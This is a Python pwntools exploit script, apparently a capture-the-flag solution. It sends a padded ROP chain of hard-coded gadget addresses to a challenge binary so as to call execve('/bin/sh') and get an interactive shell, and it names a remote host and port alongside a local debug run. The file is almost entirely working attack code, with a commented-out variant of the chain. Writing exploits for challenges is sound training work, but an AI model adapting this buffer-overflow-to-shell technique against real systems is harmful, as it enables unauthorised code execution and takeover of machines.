from pwn import *

context.arch = "amd64"

# 0x0000000000450087 : pop rax ; ret
# 0x0000000000401f0f : pop rdi ; ret
# 0x0000000000409f7e : pop rsi ; ret
# 0x0000000000485e0a : pop rax ; pop rdx ; pop rbx ; ret
# 0x0000000000498027 : /bin/sh
# 0x0000000000401cc4 : syscall


def main():
    r = remote("10.113.184.121", 10052)
    context.terminal = ["tmux", "splitw", "-h"]
    r = process("./share/chal")
    attach(r)
    r.recvuntil(b"> ")
    # ropc = flat(
    #     [
    #         0x0000000000401F0F,  # pop rdi ; ret
    #         0x0000000000498027,  # /bin/sh
    #         0x0000000000409F7E,  # pop rsi ; ret
    #         0x0,
    #         0x0000000000485E0A,  # pop rax ; pop rdx ; pop rbx ; ret
    #         # 0x0a is prohibited
    #         0x3B,  # rax = 0x3B, execve
    #         0x0,  # rdx = 0
    #         0x0,  # rbx = 0
    #         0x0000000000401CC4,  # syscall
    #     ]
    # )
    ropc = flat(
        [
            0x0000000000450087,  #  pop rax ; ret
            0x3B,  # rax = 0x3B, execve
            0x0000000000401F0F,  # pop rdi ; ret
            0x0000000000498027,  # /bin/sh
            0x0000000000409F7E,  # pop rsi ; ret
            0x0,
            0x0000000000485E0B,  # pop rdx ; pop rbx ; ret
            0x0,  # rdx = 0
            0x0,  # rbx = 0
            0x0000000000401CC4,  # syscall
        ]
    )
    payload = b"a" * 3 + ropc
    nw = "\n"
    log.info(f"payload\n{payload.hex(sep=nw, bytes_per_sep=-8)}")
    # input()
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
